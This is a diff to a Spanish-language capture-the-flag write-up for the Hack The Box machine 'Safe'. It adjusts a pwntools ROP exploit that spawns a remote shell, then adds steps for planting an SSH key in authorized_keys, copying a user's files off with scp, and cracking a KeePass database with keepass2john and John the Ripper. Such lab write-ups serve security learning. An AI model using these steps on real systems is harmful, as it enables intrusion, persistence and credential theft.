@@ -262,7 +262,7 @@ python3 -m pip install --upgrade pwntools
 Una vez definida la base del script, podemos empezar a trabajar. Nos interesa saber en que registro, se está almacenando el comando `uptime`, para lo cual, empezaremos por definir un proceso, el cual será la depuración del binario, añadiremos un _breakpoint_ en la dirección donde se hace la llamada al sistema, y, adicional a ello, indicaremos al script que nos espere hasta escribir algo después de _What do you want me to echo back?_, caso contrario, el script se cerrará.
 
 ```python
-p = gdb.debug('ubicación/del/binario/myapp', 'b *0x40116e')
+p = gdb.debug('/ubicación/del/binario/myapp', 'b *0x40116e')
 p.recvuntil("What do you want me to echo back?")
 ```
 
@@ -372,7 +372,7 @@ context.terminal = ['gnome-terminal', '-x']
 context.arch = 'amd64'
 context.os = 'linux'
 
-# p = gdb.debug('/home/m4teo/Documents/hackTheBox/machines/Safe/content/myapp', 'b *0x40116e')
+# p = gdb.debug('/ubicación/del/binario/myapp', 'b *0x40116e')
 # p.recvuntil("What do you want me to echo back?")
 
 p = remote("10.10.10.147", 1337)
@@ -392,6 +392,108 @@ p.sendline(junk + binSh + popR13 + system + nullByte + nullByte + test)
 p.interactive()
 ```
 
+Al ejecutar nuestro script, lo que vamos a conseguir es una consola, por lo que una vez dentro del sistema, podríamos listar la flag del usuario con bajos privilegios.
+
+```
+find / -name user.txt 2> /dev/null
+```
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/28.png)
+
 ### [](#header-3)Escalada De Privilegios
 
-En un futuro...
+Para conseguir la flag del usuario con máximos privilegios, podemos emepezar por listar el contenido dentro de la carpeta del usuario user.
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/29.png)
+
+Nos vamos a encontrar con una serie de imágenes, en adición de un archivo de extensión `.kdbx`, el cual guarda relación con el gestor de contraseñas KeePass. Debido a que nos encontramos en una máquina remota, no podremos visualizar las imágenes alojadas dentro de la máquina víctima, por lo que tenemos que buscar una forma de transferirlas a nuestro equipo.
+
+Si recordamos, el puerto 22 estaba abierto, por lo que podríamos conectarnos por `SSH` a la máquina remota, no obstante, ¿cómo nos vamos a conectar sin proporcionar credenciales? Esto lo haremos introduciendo nuestra clave pública, dentro de un archivo de nombre `authorized_keys` ubicado en la carpeta `.ssh`, dentro del directorio del usuario user.
+
+Lo primero que haremos será crear un par de claves `SSH`, una pública, y una privda, esto lo haremos haciendo uso de `ssh-key`.
+
+```
+cd ~/.ssh/
+ssh-keygen
+```
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/30.png)
+
+En caso de querer ingresar algún tipo de contraseña, se lo puede hacer. Ya teniendo el par de claves `SSH`, vamos a copiar el contenido de nuestra clave pública, para posteiormente añadirla en la ruta `/home/user/.ssh/authorized_keys`.
+
+
+```
+echo "nuestraClavePública" >> /home/user/.ssh/authorized_keys
+```
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/31.png)
+
+Una vez hecho esto, podemos conectarnos a través de `SSH` a la máquina víctima.
+
+```
+ssh user@10.10.10.147
+```
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/32.png)
+
+En vista de que estamos conectados a la máquina vía `SSH`, podríamos intentar transferir los archivos del directorio `/home/user/`, haciendo uso de `SCP` (_Secure Copy Protocol_), aunque también pudimos haberlo hecho creando un servidor en la máquina remota mediante `Busybox`, y posteriormente, descargando las imágnes a través de `Wget`.
+
+```
+scp "user@10.10.10.147:/home/user/*" .
+```
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/33.png)
+
+Una vez tengamos tanto las imágenes como el archivo `MyPasswords.kdbx` en nuestro equipo, podemos empezar a analizar que hacer con ello; dudo mucho que las imágenes tengan algo que ver con `esteganografía`, ya que si abrimos el archivo `MyPasswords.kdbx` con `keepassxc`, nos pregunta por un archivo clave.
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/34.png)
+
+En caso de no contar con `keepassxc` instalado, podemos hacer lo siguiente:
+
+```
+sudo apt install keepassxc
+```
+
+Ya en este punto, lo que se nos podría ocurrir sería intentar aplicar fuerza bruta sobre el archivo `MyPasswords.kdbx`, no obstante, primero tendremos que pasar de formato `KeePass`, a formato `john`, para crackear la contraseña haciendo uso de `John the Ripper`, de modo que usaremos  `keepass2john`.
+
+Antes de hacerlo hay que recordar que las imágenes están por algo, para lo cual se las pasaremos como argumento a `keepass2john`, mediante el parámetro `-k`. Esto se vería algo así:
+
+```bash
+keepass2john -k <imagenDeseada> MyPasswords.kdbx
+```
+
+Esto va a hacer el trabajo, pero podemos reducir tiempo automatizándolo, para ello haremos uso de un _bucle for_, para ir iterando sobre cada imagen.
+
+```bash
+for image in $(echo "IMG_0545.JPG  IMG_0546.JPG  IMG_0547.JPG  IMG_0548.JPG  IMG_0552.JPG  IMG_0553.JPG"); do keepass2john -k $image MyPasswords.kdbx; done
+```
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/35.png)
+
+Utilizar el comando anterior nos sirve, sin embargo, si lo pensamos un poco, si redirigimos este ouput a un fichero hashes.txt, por ejemplo, al cual luego le aplicaremos `john`, cuando este encuentre la contraseña, nos dirá que la imágen que utilizó fue _MyPasswords_, lo cual no nos es de ayuda, por lo que podemos reemplazar _MyPasswords_, por el nombre de la imagen.
+
+```bash
+for image in $(echo "IMG_0545.JPG  IMG_0546.JPG  IMG_0547.JPG  IMG_0548.JPG  IMG_0552.JPG  IMG_0553.JPG"); do keepass2john -k $image MyPasswords.kdbx | sed "s/MyPasswords/$image/"; done >> nombreArchivo
+```
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/36.png)
+
+Finalmente, para crackear la contraseña, haremos uso de `john` en conjunto del diccionario [rockyou.txt](https://objects.githubusercontent.com/github-production-release-asset-2e65be/97553311/d4f580f8-6b49-11e7-8f70-7f460f85ab3a?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220111%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220111T031535Z&X-Amz-Expires=300&X-Amz-Signature=a2189ee927b2cf3f8ed994d5079a153827b7653c7e24e4865c16a6e88aadcf51&X-Amz-SignedHeaders=host&actor_id=79855501&key_id=0&repo_id=97553311&response-content-disposition=attachment%3B%20filename%3Drockyou.txt&response-content-type=application%2Foctet-stream).
+
+En caso de no contar con la herramienta John the Ripper instalada, podemos hacer lo siguiente:
+
+```
+sudo apt install john
+```
+
+```
+sudo john --wordlist=/dirección/del/diccionario/rockyou.txt nombreArchivo
+```
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/37.png)
+
+Una vez conseguimos tanto la contraseña como el archivo clave, ya podremos abrir el archivo `MyPasswords.kdbx`.
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/38.png)
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/39.png)
+
+Y ya con la contraseña del usuario root en nuestro poder, podremos listar la última flag.
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/40.png)
